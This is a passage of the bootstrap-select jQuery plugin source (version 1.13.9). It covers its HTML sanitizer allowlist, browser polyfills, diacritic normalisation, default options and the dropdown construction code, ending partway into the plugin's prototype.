

 (function ($) {
    'use strict';
  
    var DISALLOWED_ATTRIBUTES = ['sanitize', 'whiteList', 'sanitizeFn'];
  
    var uriAttrs = [
      'background',
      'cite',
      'href',
      'itemtype',
      'longdesc',
      'poster',
      'src',
      'xlink:href'
    ];
  
    var ARIA_ATTRIBUTE_PATTERN = /^aria-[\w-]*$/i;
  
    var DefaultWhitelist = {
      // Global attributes allowed on any supplied element below.
      '*': ['class', 'dir', 'id', 'lang', 'role', 'tabindex', 'style', ARIA_ATTRIBUTE_PATTERN],
      a: ['target', 'href', 'title', 'rel'],
      area: [],
      b: [],
      br: [],
      col: [],
      code: [],
      div: [],
      em: [],
      hr: [],
      h1: [],
      h2: [],
      h3: [],
      h4: [],
      h5: [],
      h6: [],
      i: [],
      img: ['src', 'alt', 'title', 'width', 'height'],
      li: [],
      ol: [],
      p: [],
      pre: [],
      s: [],
      small: [],
      span: [],
      sub: [],
      sup: [],
      strong: [],
      u: [],
      ul: []
    }
  
    /**
     * A pattern that recognizes a commonly useful subset of URLs that are safe.
     *
     * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
     */
    var SAFE_URL_PATTERN = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|$))/gi;
  
    /**
     * A pattern that matches safe data URLs. Only matches image, video and audio types.
     *
     * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
     */
    var DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i;
  
    function allowedAttribute (attr, allowedAttributeList) {
      var attrName = attr.nodeName.toLowerCase()
  
      if ($.inArray(attrName, allowedAttributeList) !== -1) {
        if ($.inArray(attrName, uriAttrs) !== -1) {
          return Boolean(attr.nodeValue.match(SAFE_URL_PATTERN) || attr.nodeValue.match(DATA_URL_PATTERN))
        }
  
        return true
      }
  
      var regExp = $(allowedAttributeList).filter(function (index, value) {
        return value instanceof RegExp
      })
  
      // Check if a regular expression validates the attribute.
      for (var i = 0, l = regExp.length; i < l; i++) {
        if (attrName.match(regExp[i])) {
          return true
        }
      }
  
      return false
    }
  
    function sanitizeHtml (unsafeElements, whiteList, sanitizeFn) {
      if (sanitizeFn && typeof sanitizeFn === 'function') {
        return sanitizeFn(unsafeElements);
      }
  
      var whitelistKeys = Object.keys(whiteList);
  
      for (var i = 0, len = unsafeElements.length; i < len; i++) {
        var elements = unsafeElements[i].querySelectorAll('*');
  
        for (var j = 0, len2 = elements.length; j < len2; j++) {
          var el = elements[j];
          var elName = el.nodeName.toLowerCase();
  
          if (whitelistKeys.indexOf(elName) === -1) {
            el.parentNode.removeChild(el);
  
            continue;
          }
  
          var attributeList = [].slice.call(el.attributes);
          var whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || []);
  
          for (var k = 0, len3 = attributeList.length; k < len3; k++) {
            var attr = attributeList[k];
  
            if (!allowedAttribute(attr, whitelistedAttributes)) {
              el.removeAttribute(attr.nodeName);
            }
          }
        }
      }
    }
  
    // Polyfill for browsers with no classList support
    // Remove in v2
    if (!('classList' in document.createElement('_'))) {
      (function (view) {
        if (!('Element' in view)) return;
  
        var classListProp = 'classList',
            protoProp = 'prototype',
            elemCtrProto = view.Element[protoProp],
            objCtr = Object,
            classListGetter = function () {
              var $elem = $(this);
  
              return {
                add: function (classes) {
                  classes = Array.prototype.slice.call(arguments).join(' ');
                  return $elem.addClass(classes);
                },
                remove: function (classes) {
                  classes = Array.prototype.slice.call(arguments).join(' ');
                  return $elem.removeClass(classes);
                },
                toggle: function (classes, force) {
                  return $elem.toggleClass(classes, force);
                },
                contains: function (classes) {
                  return $elem.hasClass(classes);
                }
              }
            };
  
        if (objCtr.defineProperty) {
          var classListPropDesc = {
            get: classListGetter,
            enumerable: true,
            configurable: true
          };
          try {
            objCtr.defineProperty(elemCtrProto, classListProp, classListPropDesc);
          } catch (ex) { // IE 8 doesn't support enumerable:true
            // adding undefined to fight this issue https://github.com/eligrey/classList.js/issues/36
            // modernie IE8-MSW7 machine has IE8 8.0.6001.18702 and is affected
            if (ex.number === undefined || ex.number === -0x7FF5EC54) {
              classListPropDesc.enumerable = false;
              objCtr.defineProperty(elemCtrProto, classListProp, classListPropDesc);
            }
          }
        } else if (objCtr[protoProp].__defineGetter__) {
          elemCtrProto.__defineGetter__(classListProp, classListGetter);
        }
      }(window));
    }
  
    var testElement = document.createElement('_');
  
    testElement.classList.add('c1', 'c2');
  
    if (!testElement.classList.contains('c2')) {
      var _add = DOMTokenList.prototype.add,
          _remove = DOMTokenList.prototype.remove;
  
      DOMTokenList.prototype.add = function () {
        Array.prototype.forEach.call(arguments, _add.bind(this));
      }
  
      DOMTokenList.prototype.remove = function () {
        Array.prototype.forEach.call(arguments, _remove.bind(this));
      }
    }
  
    testElement.classList.toggle('c3', false);
  
    // Polyfill for IE 10 and Firefox <24, where classList.toggle does not
    // support the second argument.
    if (testElement.classList.contains('c3')) {
      var _toggle = DOMTokenList.prototype.toggle;
  
      DOMTokenList.prototype.toggle = function (token, force) {
        if (1 in arguments && !this.contains(token) === !force) {
          return force;
        } else {
          return _toggle.call(this, token);
        }
      };
    }
  
    testElement = null;
  
    // shallow array comparison
    function isEqual (array1, array2) {
      return array1.length === array2.length && array1.every(function (element, index) {
        return element === array2[index];
      });
    };
  
    // <editor-fold desc="Shims">
    if (!String.prototype.startsWith) {
      (function () {
        'use strict'; // needed to support `apply`/`call` with `undefined`/`null`
        var defineProperty = (function () {
          // IE 8 only supports `Object.defineProperty` on DOM elements
          try {
            var object = {};
            var $defineProperty = Object.defineProperty;
            var result = $defineProperty(object, object, object) && $defineProperty;
          } catch (error) {
          }
          return result;
        }());
        var toString = {}.toString;
        var startsWith = function (search) {
          if (this == null) {
            throw new TypeError();
          }
          var string = String(this);
          if (search && toString.call(search) == '[object RegExp]') {
            throw new TypeError();
          }
          var stringLength = string.length;
          var searchString = String(search);
          var searchLength = searchString.length;
          var position = arguments.length > 1 ? arguments[1] : undefined;
          // `ToInteger`
          var pos = position ? Number(position) : 0;
          if (pos != pos) { // better `isNaN`
            pos = 0;
          }
          var start = Math.min(Math.max(pos, 0), stringLength);
          // Avoid the `indexOf` call if no match is possible
          if (searchLength + start > stringLength) {
            return false;
          }
          var index = -1;
          while (++index < searchLength) {
            if (string.charCodeAt(start + index) != searchString.charCodeAt(index)) {
              return false;
            }
          }
          return true;
        };
        if (defineProperty) {
          defineProperty(String.prototype, 'startsWith', {
            'value': startsWith,
            'configurable': true,
            'writable': true
          });
        } else {
          String.prototype.startsWith = startsWith;
        }
      }());
    }
  
    if (!Object.keys) {
      Object.keys = function (
        o, // object
        k, // key
        r  // result array
      ) {
        // initialize object and result
        r = [];
        // iterate over object keys
        for (k in o) {
          // fill result array with non-prototypical keys
          r.hasOwnProperty.call(o, k) && r.push(k);
        }
        // return result
        return r;
      };
    }
  
    if (HTMLSelectElement && !HTMLSelectElement.prototype.hasOwnProperty('selectedOptions')) {
      Object.defineProperty(HTMLSelectElement.prototype, 'selectedOptions', {
        get: function () {
          return this.querySelectorAll(':checked');
        }
      });
    }
  
    // much faster than $.val()
    function getSelectValues (select) {
      var result = [];
      var options = select.selectedOptions;
      var opt;
  
      if (select.multiple) {
        for (var i = 0, len = options.length; i < len; i++) {
          opt = options[i];
  
          result.push(opt.value || opt.text);
        }
      } else {
        result = select.value;
      }
  
      return result;
    }
  
    // set data-selected on select element if the value has been programmatically selected
    // prior to initialization of bootstrap-select
    // * consider removing or replacing an alternative method *
    var valHooks = {
      useDefault: false,
      _set: $.valHooks.select.set
    };
  
    $.valHooks.select.set = function (elem, value) {
      if (value && !valHooks.useDefault) $(elem).data('selected', true);
  
      return valHooks._set.apply(this, arguments);
    };
  
    var changedArguments = null;
  
    var EventIsSupported = (function () {
      try {
        new Event('change');
        return true;
      } catch (e) {
        return false;
      }
    })();
  
    $.fn.triggerNative = function (eventName) {
      var el = this[0],
          event;
  
      if (el.dispatchEvent) { // for modern browsers & IE9+
        if (EventIsSupported) {
          // For modern browsers
          event = new Event(eventName, {
            bubbles: true
          });
        } else {
          // For IE since it doesn't support Event constructor
          event = document.createEvent('Event');
          event.initEvent(eventName, true, false);
        }
  
        el.dispatchEvent(event);
      } else if (el.fireEvent) { // for IE8
        event = document.createEventObject();
        event.eventType = eventName;
        el.fireEvent('on' + eventName, event);
      } else {
        // fall back to jQuery.trigger
        this.trigger(eventName);
      }
    };
    // </editor-fold>
  
    function stringSearch (li, searchString, method, normalize) {
      var stringTypes = [
            'display',
            'subtext',
            'tokens'
          ],
          searchSuccess = false;
  
      for (var i = 0; i < stringTypes.length; i++) {
        var stringType = stringTypes[i],
            string = li[stringType];
  
        if (string) {
          string = string.toString();
  
          // Strip HTML tags. This isn't perfect, but it's much faster than any other method
          if (stringType === 'display') {
            string = string.replace(/<[^>]+>/g, '');
          }
  
          if (normalize) string = normalizeToBase(string);
          string = string.toUpperCase();
  
          if (method === 'contains') {
            searchSuccess = string.indexOf(searchString) >= 0;
          } else {
            searchSuccess = string.startsWith(searchString);
          }
  
          if (searchSuccess) break;
        }
      }
  
      return searchSuccess;
    }
  
    function toInteger (value) {
      return parseInt(value, 10) || 0;
    }
  
    // Borrowed from Lodash (_.deburr)
    /** Used to map Latin Unicode letters to basic Latin letters. */
    var deburredLetters = {
      // Latin-1 Supplement block.
      '\xc0': 'A',  '\xc1': 'A', '\xc2': 'A', '\xc3': 'A', '\xc4': 'A', '\xc5': 'A',
      '\xe0': 'a',  '\xe1': 'a', '\xe2': 'a', '\xe3': 'a', '\xe4': 'a', '\xe5': 'a',
      '\xc7': 'C',  '\xe7': 'c',
      '\xd0': 'D',  '\xf0': 'd',
      '\xc8': 'E',  '\xc9': 'E', '\xca': 'E', '\xcb': 'E',
      '\xe8': 'e',  '\xe9': 'e', '\xea': 'e', '\xeb': 'e',
      '\xcc': 'I',  '\xcd': 'I', '\xce': 'I', '\xcf': 'I',
      '\xec': 'i',  '\xed': 'i', '\xee': 'i', '\xef': 'i',
      '\xd1': 'N',  '\xf1': 'n',
      '\xd2': 'O',  '\xd3': 'O', '\xd4': 'O', '\xd5': 'O', '\xd6': 'O', '\xd8': 'O',
      '\xf2': 'o',  '\xf3': 'o', '\xf4': 'o', '\xf5': 'o', '\xf6': 'o', '\xf8': 'o',
      '\xd9': 'U',  '\xda': 'U', '\xdb': 'U', '\xdc': 'U',
      '\xf9': 'u',  '\xfa': 'u', '\xfb': 'u', '\xfc': 'u',
      '\xdd': 'Y',  '\xfd': 'y', '\xff': 'y',
      '\xc6': 'Ae', '\xe6': 'ae',
      '\xde': 'Th', '\xfe': 'th',
      '\xdf': 'ss',
      // Latin Extended-A block.
      '\u0100': 'A',  '\u0102': 'A', '\u0104': 'A',
      '\u0101': 'a',  '\u0103': 'a', '\u0105': 'a',
      '\u0106': 'C',  '\u0108': 'C', '\u010a': 'C', '\u010c': 'C',
      '\u0107': 'c',  '\u0109': 'c', '\u010b': 'c', '\u010d': 'c',
      '\u010e': 'D',  '\u0110': 'D', '\u010f': 'd', '\u0111': 'd',
      '\u0112': 'E',  '\u0114': 'E', '\u0116': 'E', '\u0118': 'E', '\u011a': 'E',
      '\u0113': 'e',  '\u0115': 'e', '\u0117': 'e', '\u0119': 'e', '\u011b': 'e',
      '\u011c': 'G',  '\u011e': 'G', '\u0120': 'G', '\u0122': 'G',
      '\u011d': 'g',  '\u011f': 'g', '\u0121': 'g', '\u0123': 'g',
      '\u0124': 'H',  '\u0126': 'H', '\u0125': 'h', '\u0127': 'h',
      '\u0128': 'I',  '\u012a': 'I', '\u012c': 'I', '\u012e': 'I', '\u0130': 'I',
      '\u0129': 'i',  '\u012b': 'i', '\u012d': 'i', '\u012f': 'i', '\u0131': 'i',
      '\u0134': 'J',  '\u0135': 'j',
      '\u0136': 'K',  '\u0137': 'k', '\u0138': 'k',
      '\u0139': 'L',  '\u013b': 'L', '\u013d': 'L', '\u013f': 'L', '\u0141': 'L',
      '\u013a': 'l',  '\u013c': 'l', '\u013e': 'l', '\u0140': 'l', '\u0142': 'l',
      '\u0143': 'N',  '\u0145': 'N', '\u0147': 'N', '\u014a': 'N',
      '\u0144': 'n',  '\u0146': 'n', '\u0148': 'n', '\u014b': 'n',
      '\u014c': 'O',  '\u014e': 'O', '\u0150': 'O',
      '\u014d': 'o',  '\u014f': 'o', '\u0151': 'o',
      '\u0154': 'R',  '\u0156': 'R', '\u0158': 'R',
      '\u0155': 'r',  '\u0157': 'r', '\u0159': 'r',
      '\u015a': 'S',  '\u015c': 'S', '\u015e': 'S', '\u0160': 'S',
      '\u015b': 's',  '\u015d': 's', '\u015f': 's', '\u0161': 's',
      '\u0162': 'T',  '\u0164': 'T', '\u0166': 'T',
      '\u0163': 't',  '\u0165': 't', '\u0167': 't',
      '\u0168': 'U',  '\u016a': 'U', '\u016c': 'U', '\u016e': 'U', '\u0170': 'U', '\u0172': 'U',
      '\u0169': 'u',  '\u016b': 'u', '\u016d': 'u', '\u016f': 'u', '\u0171': 'u', '\u0173': 'u',
      '\u0174': 'W',  '\u0175': 'w',
      '\u0176': 'Y',  '\u0177': 'y', '\u0178': 'Y',
      '\u0179': 'Z',  '\u017b': 'Z', '\u017d': 'Z',
      '\u017a': 'z',  '\u017c': 'z', '\u017e': 'z',
      '\u0132': 'IJ', '\u0133': 'ij',
      '\u0152': 'Oe', '\u0153': 'oe',
      '\u0149': "'n", '\u017f': 's'
    };
  
    /** Used to match Latin Unicode letters (excluding mathematical operators). */
    var reLatin = /[\xc0-\xd6\xd8-\xf6\xf8-\xff\u0100-\u017f]/g;
  
    /** Used to compose unicode character classes. */
    var rsComboMarksRange = '\\u0300-\\u036f',
        reComboHalfMarksRange = '\\ufe20-\\ufe2f',
        rsComboSymbolsRange = '\\u20d0-\\u20ff',
        rsComboMarksExtendedRange = '\\u1ab0-\\u1aff',
        rsComboMarksSupplementRange = '\\u1dc0-\\u1dff',
        rsComboRange = rsComboMarksRange + reComboHalfMarksRange + rsComboSymbolsRange + rsComboMarksExtendedRange + rsComboMarksSupplementRange;
  
    /** Used to compose unicode capture groups. */
    var rsCombo = '[' + rsComboRange + ']';
  
    /**
     * Used to match [combining diacritical marks](https://en.wikipedia.org/wiki/Combining_Diacritical_Marks) and
     * [combining diacritical marks for symbols](https://en.wikipedia.org/wiki/Combining_Diacritical_Marks_for_Symbols).
     */
    var reComboMark = RegExp(rsCombo, 'g');
  
    function deburrLetter (key) {
      return deburredLetters[key];
    };
  
    function normalizeToBase (string) {
      string = string.toString();
      return string && string.replace(reLatin, deburrLetter).replace(reComboMark, '');
    }
  
    // List of HTML entities for escaping.
    var escapeMap = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '`': '&#x60;'
    };
  
    // Functions for escaping and unescaping strings to/from HTML interpolation.
    var createEscaper = function (map) {
      var escaper = function (match) {
        return map[match];
      };
      // Regexes for identifying a key that needs to be escaped.
      var source = '(?:' + Object.keys(map).join('|') + ')';
      var testRegexp = RegExp(source);
      var replaceRegexp = RegExp(source, 'g');
      return function (string) {
        string = string == null ? '' : '' + string;
        return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
      };
    };
  
    var htmlEscape = createEscaper(escapeMap);
  
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
  
    var keyCodeMap = {
      32: ' ',
      48: '0',
      49: '1',
      50: '2',
      51: '3',
      52: '4',
      53: '5',
      54: '6',
      55: '7',
      56: '8',
      57: '9',
      59: ';',
      65: 'A',
      66: 'B',
      67: 'C',
      68: 'D',
      69: 'E',
      70: 'F',
      71: 'G',
      72: 'H',
      73: 'I',
      74: 'J',
      75: 'K',
      76: 'L',
      77: 'M',
      78: 'N',
      79: 'O',
      80: 'P',
      81: 'Q',
      82: 'R',
      83: 'S',
      84: 'T',
      85: 'U',
      86: 'V',
      87: 'W',
      88: 'X',
      89: 'Y',
      90: 'Z',
      96: '0',
      97: '1',
      98: '2',
      99: '3',
      100: '4',
      101: '5',
      102: '6',
      103: '7',
      104: '8',
      105: '9'
    };
  
    var keyCodes = {
      ESCAPE: 27, // KeyboardEvent.which value for Escape (Esc) key
      ENTER: 13, // KeyboardEvent.which value for Enter key
      SPACE: 32, // KeyboardEvent.which value for space key
      TAB: 9, // KeyboardEvent.which value for tab key
      ARROW_UP: 38, // KeyboardEvent.which value for up arrow key
      ARROW_DOWN: 40 // KeyboardEvent.which value for down arrow key
    }
  
    var version = {
      success: false,
      major: '3'
    };
  
    try {
      version.full = ($.fn.dropdown.Constructor.VERSION || '').split(' ')[0].split('.');
      version.major = version.full[0];
      version.success = true;
    } catch (err) {
      // do nothing
    }
  
    var selectId = 0;
  
    var EVENT_KEY = '.bs.select';
  
    var classNames = {
      DISABLED: 'disabled',
      DIVIDER: 'divider',
      SHOW: 'open',
      DROPUP: 'dropup',
      MENU: 'dropdown-menu',
      MENURIGHT: 'dropdown-menu-right',
      MENULEFT: 'dropdown-menu-left',
      // to-do: replace with more advanced template/customization options
      BUTTONCLASS: 'btn-default',
      POPOVERHEADER: 'popover-title',
      ICONBASE: 'glyphicon',
      TICKICON: 'glyphicon-ok'
    }
  
    var Selector = {
      MENU: '.' + classNames.MENU
    }
  
    var elementTemplates = {
      span: document.createElement('span'),
      i: document.createElement('i'),
      subtext: document.createElement('small'),
      a: document.createElement('a'),
      li: document.createElement('li'),
      whitespace: document.createTextNode('\u00A0'),
      fragment: document.createDocumentFragment()
    }
  
    elementTemplates.a.setAttribute('role', 'option');
    elementTemplates.subtext.className = 'text-muted';
  
    elementTemplates.text = elementTemplates.span.cloneNode(false);
    elementTemplates.text.className = 'text';
  
    elementTemplates.checkMark = elementTemplates.span.cloneNode(false);
  
    var REGEXP_ARROW = new RegExp(keyCodes.ARROW_UP + '|' + keyCodes.ARROW_DOWN);
    var REGEXP_TAB_OR_ESCAPE = new RegExp('^' + keyCodes.TAB + '$|' + keyCodes.ESCAPE);
  
    var generateOption = {
      li: function (content, classes, optgroup) {
        var li = elementTemplates.li.cloneNode(false);
  
        if (content) {
          if (content.nodeType === 1 || content.nodeType === 11) {
            li.appendChild(content);
          } else {
            li.innerHTML = content;
          }
        }
  
        if (typeof classes !== 'undefined' && classes !== '') li.className = classes;
        if (typeof optgroup !== 'undefined' && optgroup !== null) li.classList.add('optgroup-' + optgroup);
  
        return li;
      },
  
      a: function (text, classes, inline) {
        var a = elementTemplates.a.cloneNode(true);
  
        if (text) {
          if (text.nodeType === 11) {
            a.appendChild(text);
          } else {
            a.insertAdjacentHTML('beforeend', text);
          }
        }
  
        if (typeof classes !== 'undefined' && classes !== '') a.className = classes;
        if (version.major === '4') a.classList.add('dropdown-item');
        if (inline) a.setAttribute('style', inline);
  
        return a;
      },
  
      text: function (options, useFragment) {
        var textElement = elementTemplates.text.cloneNode(false),
            subtextElement,
            iconElement;
  
        if (options.content) {
          textElement.innerHTML = options.content;
        } else {
          textElement.textContent = options.text;
  
          if (options.icon) {
            var whitespace = elementTemplates.whitespace.cloneNode(false);
  
            // need to use <i> for icons in the button to prevent a breaking change
            // note: switch to span in next major release
            iconElement = (useFragment === true ? elementTemplates.i : elementTemplates.span).cloneNode(false);
            iconElement.className = options.iconBase + ' ' + options.icon;
  
            elementTemplates.fragment.appendChild(iconElement);
            elementTemplates.fragment.appendChild(whitespace);
          }
  
          if (options.subtext) {
            subtextElement = elementTemplates.subtext.cloneNode(false);
            subtextElement.textContent = options.subtext;
            textElement.appendChild(subtextElement);
          }
        }
  
        if (useFragment === true) {
          while (textElement.childNodes.length > 0) {
            elementTemplates.fragment.appendChild(textElement.childNodes[0]);
          }
        } else {
          elementTemplates.fragment.appendChild(textElement);
        }
  
        return elementTemplates.fragment;
      },
  
      label: function (options) {
        var textElement = elementTemplates.text.cloneNode(false),
            subtextElement,
            iconElement;
  
        textElement.innerHTML = options.label;
  
        if (options.icon) {
          var whitespace = elementTemplates.whitespace.cloneNode(false);
  
          iconElement = elementTemplates.span.cloneNode(false);
          iconElement.className = options.iconBase + ' ' + options.icon;
  
          elementTemplates.fragment.appendChild(iconElement);
          elementTemplates.fragment.appendChild(whitespace);
        }
  
        if (options.subtext) {
          subtextElement = elementTemplates.subtext.cloneNode(false);
          subtextElement.textContent = options.subtext;
          textElement.appendChild(subtextElement);
        }
  
        elementTemplates.fragment.appendChild(textElement);
  
        return elementTemplates.fragment;
      }
    }
  
    var Selectpicker = function (element, options) {
      var that = this;
  
      // bootstrap-select has been initialized - revert valHooks.select.set back to its original function
      if (!valHooks.useDefault) {
        $.valHooks.select.set = valHooks._set;
        valHooks.useDefault = true;
      }
  
      this.$element = $(element);
      this.$newElement = null;
      this.$button = null;
      this.$menu = null;
      this.options = options;
      this.selectpicker = {
        main: {},
        current: {}, // current changes if a search is in progress
        search: {},
        view: {},
        keydown: {
          keyHistory: '',
          resetKeyHistory: {
            start: function () {
              return setTimeout(function () {
                that.selectpicker.keydown.keyHistory = '';
              }, 800);
            }
          }
        }
      };
      // If we have no title yet, try to pull it from the html title attribute (jQuery doesnt' pick it up as it's not a
      // data-attribute)
      if (this.options.title === null) {
        this.options.title = this.$element.attr('title');
      }
  
      // Format window padding
      var winPad = this.options.windowPadding;
      if (typeof winPad === 'number') {
        this.options.windowPadding = [winPad, winPad, winPad, winPad];
      }
  
      // Expose public methods
      this.val = Selectpicker.prototype.val;
      this.render = Selectpicker.prototype.render;
      this.refresh = Selectpicker.prototype.refresh;
      this.setStyle = Selectpicker.prototype.setStyle;
      this.selectAll = Selectpicker.prototype.selectAll;
      this.deselectAll = Selectpicker.prototype.deselectAll;
      this.destroy = Selectpicker.prototype.destroy;
      this.remove = Selectpicker.prototype.remove;
      this.show = Selectpicker.prototype.show;
      this.hide = Selectpicker.prototype.hide;
  
      this.init();
    };
  
    Selectpicker.VERSION = '1.13.9';
  
    // part of this is duplicated in i18n/defaults-en_US.js. Make sure to update both.
    Selectpicker.DEFAULTS = {
      noneSelectedText: 'Nothing selected',
      noneResultsText: 'No results matched {0}',
      countSelectedText: function (numSelected, numTotal) {
        return (numSelected == 1) ? '{0} item selected' : '{0} items selected';
      },
      maxOptionsText: function (numAll, numGroup) {
        return [
          (numAll == 1) ? 'Limit reached ({n} item max)' : 'Limit reached ({n} items max)',
          (numGroup == 1) ? 'Group limit reached ({n} item max)' : 'Group limit reached ({n} items max)'
        ];
      },
      selectAllText: 'Select All',
      deselectAllText: 'Deselect All',
      doneButton: false,
      doneButtonText: 'Close',
      multipleSeparator: ', ',
      styleBase: 'btn',
      style: classNames.BUTTONCLASS,
      size: 'auto',
      title: null,
      selectedTextFormat: 'values',
      width: false,
      container: false,
      hideDisabled: false,
      showSubtext: false,
      showIcon: true,
      showContent: true,
      dropupAuto: true,
      header: false,
      liveSearch: false,
      liveSearchPlaceholder: null,
      liveSearchNormalize: false,
      liveSearchStyle: 'contains',
      actionsBox: false,
      iconBase: classNames.ICONBASE,
      tickIcon: classNames.TICKICON,
      showTick: false,
      template: {
        caret: '<span class="caret"></span>'
      },
      maxOptions: false,
      mobile: false,
      selectOnTab: false,
      dropdownAlignRight: false,
      windowPadding: 0,
      virtualScroll: 600,
      display: false,
      sanitize: true,
      sanitizeFn: null,
      whiteList: DefaultWhitelist
    };
  
    Selectpicker.prototype = {
  
      constructor: Selectpicker,
  
      init: function () {
        var that = this,
            id = this.$element.attr('id');
  
        this.selectId = selectId++;
  
        this.$element[0].classList.add('bs-select-hidden');
  
        this.multiple = this.$element.prop('multiple');
        this.autofocus = this.$element.prop('autofocus');
        this.options.showTick = this.$element[0].classList.contains('show-tick');
  
        this.$newElement = this.createDropdown();
        this.$element
          .after(this.$newElement)
          .prependTo(this.$newElement);
  
        this.$button = this.$newElement.children('button');
        this.$menu = this.$newElement.children(Selector.MENU);
        this.$menuInner = this.$menu.children('.inner');
        this.$searchbox = this.$menu.find('input');
  
        this.$element[0].classList.remove('bs-select-hidden');
  
        if (this.options.dropdownAlignRight === true) this.$menu[0].classList.add(classNames.MENURIGHT);
  
        if (typeof id !== 'undefined') {
          this.$button.attr('data-id', id);
        }
  
        this.checkDisabled();
        this.clickListener();
        if (this.options.liveSearch) this.liveSearchListener();
        this.setStyle();
        this.render();
        this.setWidth();
        if (this.options.container) {
          this.selectPosition();
        } else {
          this.$element.on('hide' + EVENT_KEY, function () {
            if (that.isVirtual()) {
              // empty menu on close
              var menuInner = that.$menuInner[0],
                  emptyMenu = menuInner.firstChild.cloneNode(false);
  
              // replace the existing UL with an empty one - this is faster than $.empty() or innerHTML = ''
              menuInner.replaceChild(emptyMenu, menuInner.firstChild);
              menuInner.scrollTop = 0;
            }
          });
        }
        this.$menu.data('this', this);
        this.$newElement.data('this', this);
        if (this.options.mobile) this.mobile();
  
        this.$newElement.on({
          'hide.bs.dropdown': function (e) {
            that.$menuInner.attr('aria-expanded', false);
            that.$element.trigger('hide' + EVENT_KEY, e);
          },
          'hidden.bs.dropdown': function (e) {
            that.$element.trigger('hidden' + EVENT_KEY, e);
          },
          'show.bs.dropdown': function (e) {
            that.$menuInner.attr('aria-expanded', true);
            that.$element.trigger('show' + EVENT_KEY, e);
          },
          'shown.bs.dropdown': function (e) {
            that.$element.trigger('shown' + EVENT_KEY, e);
          }
        });
  
        if (that.$element[0].hasAttribute('required')) {
          this.$element.on('invalid' + EVENT_KEY, function () {
            that.$button[0].classList.add('bs-invalid');
  
            that.$element
              .on('shown' + EVENT_KEY + '.invalid', function () {
                that.$element
                  .val(that.$element.val()) // set the value to hide the validation message in Chrome when menu is opened
                  .off('shown' + EVENT_KEY + '.invalid');
              })
              .on('rendered' + EVENT_KEY, function () {
                // if select is no longer invalid, remove the bs-invalid class
                if (this.validity.valid) that.$button[0].classList.remove('bs-invalid');
                that.$element.off('rendered' + EVENT_KEY);
              });
  
            that.$button.on('blur' + EVENT_KEY, function () {
              that.$element.trigger('focus').trigger('blur');
              that.$button.off('blur' + EVENT_KEY);
            });
          });
        }
  
        setTimeout(function () {
          that.createLi();
          that.$element.trigger('loaded' + EVENT_KEY);
        });
      },
  
      createDropdown: function () {
        // Options
        // If we are multiple or showTick option is set, then add the show-tick class
        var showTick = (this.multiple || this.options.showTick) ? ' show-tick' : '',
            inputGroup = '',
            autofocus = this.autofocus ? ' autofocus' : '';
  
        if (version.major < 4 && this.$element.parent().hasClass('input-group')) {
          inputGroup = ' input-group-btn';
        }
  
        // Elements
        var drop,
            header = '',
            searchbox = '',
            actionsbox = '',
            donebutton = '';
  
        if (this.options.header) {
          header =
            '<div class="' + classNames.POPOVERHEADER + '">' +
              '<button type="button" class="close" aria-hidden="true">&times;</button>' +
                this.options.header +
            '</div>';
        }
  
        if (this.options.liveSearch) {
          searchbox =
            '<div class="bs-searchbox">' +
              '<input type="text" class="form-control" autocomplete="off"' +
                (
                  this.options.liveSearchPlaceholder === null ? ''
                  :
                  ' placeholder="' + htmlEscape(this.options.liveSearchPlaceholder) + '"'
                ) +
                ' role="textbox" aria-label="Search">' +
            '</div>';
        }
  
        if (this.multiple && this.options.actionsBox) {
          actionsbox =
            '<div class="bs-actionsbox">' +
              '<div class="btn-group btn-group-sm btn-block">' +
                '<button type="button" class="actions-btn bs-select-all btn ' + classNames.BUTTONCLASS + '">' +
                  this.options.selectAllText +
                '</button>' +
                '<button type="button" class="actions-btn bs-deselect-all btn ' + classNames.BUTTONCLASS + '">' +
                  this.options.deselectAllText +
                '</button>' +
              '</div>' +
            '</div>';
        }
  
        if (this.multiple && this.options.doneButton) {
          donebutton =
            '<div class="bs-donebutton">' +
              '<div class="btn-group btn-block">' +
                '<button type="button" class="btn btn-sm ' + classNames.BUTTONCLASS + '">' +
                  this.options.doneButtonText +
                '</button>' +
              '</div>' +
            '</div>';
        }
  
        drop =
          '<div class="dropdown bootstrap-select' + showTick + inputGroup + '">' +
            '<button type="button" class="' + this.options.styleBase + ' dropdown-toggle" ' + (this.options.display === 'static' ? 'data-display="static"' : '') + 'data-toggle="dropdown"' + autofocus + ' role="button">' +
              '<div class="filter-option">' +
                '<div class="filter-option-inner">' +
                  '<div class="filter-option-inner-inner"></div>' +
                '</div> ' +
              '</div>' +
              (
                version.major === '4' ? ''
                :
                '<span class="bs-caret">' +
                  this.options.template.caret +
                '</span>'
              ) +
            '</button>' +
            '<div class="' + classNames.MENU + ' ' + (version.major === '4' ? '' : classNames.SHOW) + '" role="combobox">' +
              header +
              searchbox +
              actionsbox +
              '<div class="inner ' + classNames.SHOW + '" role="listbox" aria-expanded="false" tabindex="-1">' +
                  '<ul class="' + classNames.MENU + ' inner ' + (version.major === '4' ? classNames.SHOW : '') + '">' +
                  '</ul>' +
              '</div>' +
              donebutton +
            '</div>' +
          '</div>';
  
        return $(drop);
      },
  
      setPositionData: function () {
        this.selectpicker.view.canHighlight = [];
  
        for (var i = 0; i < this.selectpicker.current.data.length; i++) {
          var li = this.selectpicker.current.data[i],
              canHighlight = true;
  
          if (li.type === 'divider') {
            canHighlight = false;
            li.height = this.sizeInfo.dividerHeight;
          } else if (li.type === 'optgroup-label') {
            canHighlight = false;
            li.height = this.sizeInfo.dropdownHeaderHeight;
          } else {
            li.height = this.sizeInfo.liHeight;
          }
  
          if (li.disabled) canHighlight = false;
  
          this.selectpicker.view.canHighlight.push(canHighlight);
  
          li.position = (i === 0 ? 0 : this.selectpicker.current.data[i - 1].position) + li.height;
        }
      },
  
      isVirtual: function () {
